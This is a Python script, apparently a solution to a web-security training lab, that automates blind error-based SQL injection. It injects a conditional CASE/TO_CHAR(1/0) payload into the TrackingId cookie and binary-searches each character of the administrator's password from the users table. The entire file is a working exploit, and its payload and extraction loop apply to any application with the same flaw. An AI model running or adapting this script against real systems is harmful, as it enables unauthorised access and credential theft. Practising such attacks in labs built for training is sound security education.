#automate 20 chars lowercase alphanumeric pw bruteforce with intelligent binary search usage
import requests
url = "https://0a3d00400324cfc18000086a00d4003a.web-security-academy.net/"
headers = {
	"Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
	"Sec-Ch-Ua-Mobile": "?0",
	"Sec-Ch-Ua-Platform": "\"Linux\"",
	"Accept-Language": "en-US,en;q=0.9",
	"Upgrade-Insecure-Requests": "1",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "navigate",
	"Sec-Fetch-User": "?1",
	"Sec-Fetch-Dest": "document",
	"Referer": "https://0a3d00400324cfc18000086a00d4003a.web-security-academy.net/",
	"Accept-Encoding": "gzip, deflate, br",
	"Priority": "u=0, i",
	"Connection": "keep-alive"
}
#Function to send the request and check for errors
def send_request(tracking_id):
	cookies = {
		"TrackingId": tracking_id,
		"session": "e36t7fMNR7WrArwnQeYSY8RgYJhneu0D"
	}
	response = requests.get(url, headers=headers, cookies=cookies)
	return "Internal Server Error" in response.text
#Function to brute-force each character of the password with binary search
def brute_force_password():
	password = ""
	for i in range(1, 21):
		low, high = 32, 126  # ASCII range for printable characters
		while low <= high:
			mid = (low + high) // 2
			tracking_id = f"Fh2QoMeYpZL5YQUe'||(SELECT CASE WHEN SUBSTR(password,{i},1)>'{chr(mid)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
			if send_request(tracking_id):
				low = mid + 1
			else:
				high = mid - 1
		password += chr(low)
		print(f"Found character {i}: {password[-1]}")
	return password
	
# Start the brute-forcing process
password = brute_force_password()
print(f"Password: {password}")
